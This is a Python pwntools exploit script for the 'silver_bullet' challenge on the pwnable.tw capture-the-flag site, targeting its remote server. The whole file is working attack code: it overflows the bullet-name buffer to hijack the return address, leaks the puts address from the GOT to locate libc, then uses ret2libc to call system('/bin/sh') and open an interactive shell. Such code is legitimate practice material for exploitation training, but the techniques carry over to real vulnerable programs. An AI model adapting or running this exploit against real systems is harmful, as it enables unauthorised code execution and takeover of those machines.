from pwn import *

DEBUG = 0

if DEBUG:
	p = process('./silver_bullet')
	bin = ELF('./silver_bullet')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('chall.pwnable.tw', 10103)
	bin = ELF('./silver_bullet')
	libc = ELF('./libc_32.so.6')

def create(name):
	p.sendlineafter('Your choice :', '1')
	p.sendafter('of bullet :', name)
	p.recvuntil('Good luck !!\n')

def powerup(name):
	p.sendlineafter('Your choice :', '2')
	p.sendafter('of bullet :', name)
	p.recvuntil('Enjoy it !\n')

def beat():
	p.sendlineafter('Your choice :', '3')

# leak libc address
create('A'*0x2f)
powerup('B')
payload = '\xff\xff\xff' + 'CCCC' + p32(bin.plt['puts']) + p32(bin.sym['main']) + p32(bin.got['puts'])
powerup(payload)
beat()
p.recvuntil('Oh ! You win !!\n')
libc.address = u32(p.recv(4)) - libc.sym['puts']
success('libc_base address: ' + hex(libc.address))
binsh = libc.search('/bin/sh\x00').next()

# ret2libc
create('A'*0x2f)
powerup('B')
payload = '\xff\xff\xff' + 'CCCC' + p32(libc.sym['system']) + p32(libc.sym['exit']) + p32(binsh)
powerup(payload)
beat()

p.interactive()